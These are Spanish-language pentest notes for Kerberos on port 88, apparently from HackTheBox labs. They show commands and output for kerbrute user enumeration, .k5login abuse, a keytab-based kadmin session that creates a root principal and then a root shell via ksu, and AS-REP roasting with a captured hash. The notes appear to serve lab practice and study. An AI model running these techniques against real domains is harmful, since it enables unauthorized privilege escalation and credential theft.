# Kerberos - 88

## Enumeración de usuarios
```null
kerbrute userenum --dc 10.10.11.175 -d outdated.htb /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt
```

## Configuración del ``krb5.conf`` para el acceso por SSH
```null
dpkg-reconfigure krb5-config
```

```null
[libdefaults]
  default_realm = REALCORP.HTB

[realms]
  REALCORP.HTB = {
    kdc = realcorp.htb:88
    }
```

El SPN debe ser el primer host al que apuntar en el ``/etc/hosts``

### Conexión
```null
kinit j.nakazawa
Password for j.nakazawa@REALCORP.HTB:
```

```null
ssh j.nakazawa@10.10.10.224
Activate the web console with: systemctl enable --now cockpit.socket

Last login: Thu Jan 19 12:36:51 2023 from 10.10.14.6
[j.nakazawa@srv01 ~]$ 
```

## Abuso de ``.krlogin`` para escalar privilegios (LINUX)

### Creación de archivo de configuración en el directorio personal de un usuario
Con esto se consigue que el usuario pwneado se pueda conectar como este otro proporcionando su TGT
```null
[j.nakazawa@srv01 squid]$ echo 'j.nakazawa@REALCORP.HTB' > .k5login
```

### Abuso de ``.keytab``

### Enumeración de TGTs proporcionado este archivo
```null
[admin@srv01 /]$ klist -k /etc/krb5.keytab
```

### Sesión interactiva proporcionando SPN
```null
kadmin -kt /etc/krb5.keytab -p kadmin/admin@REALCORP.HTB
```

### Creación de principal para el usuario ``root``, así como su contraseña
```null
kadmin:  add_principal root@REALCORP.HTB
No policy specified for root@REALCORP.HTB; defaulting to no policy
Enter password for principal "root@REALCORP.HTB": 
Re-enter password for principal "root@REALCORP.HTB": 
Principal "root@REALCORP.HTB" created.
```

### Shell como ``root``

```null
[admin@srv01 /]$ ksu
WARNING: Your password may be exposed if you enter it here and are logged 
         in remotely using an unsecure (non-encrypted) channel. 
Kerberos password for root@REALCORP.HTB: : 
Authenticated root@REALCORP.HTB
Account root: authorization for root@REALCORP.HTB successful
Changing uid to root (0)
```

### ASPRepRoast Attack

### Obtener TGT (Don't require preauth disable)

```null
root@kali# GetNPUsers.py blackfield.local/ -no-pass -usersfile users.txt -dc-ip 10.10.10.192 
$krb5asrep$23$support@BLACKFIELD.LOCAL:83f252224f04becb3108d7234f0fcd94$0f355b4ad7b813039520ec6ed1f451575c79c313a3779707b24fd8824aa74d9d4fda352599ad767167ade44f4f6a67b6e0d54016e26502ab618b0d7791a40ffc60480703a1cd6bd5ae68078ab9589a91284966a54fc6134ae52f8efc41164386e4e251b41aa09f46616d53c103216d3c3e0560c5e822937ad3b4f61527c9d4fb63664abd2888d2c379340baf682a38491978c9e63d151fc54725e969df94a34f996849c439ff6953a5c9747774d6878ff5555b8c6af1415ec3c141206c460f2d4949456f429d766072d0d348b30d642e521b14cf9cef4bc8d01da69bd3995b4019ee5bbbb024346ea7786474980ec6b1bb9d13c0
```

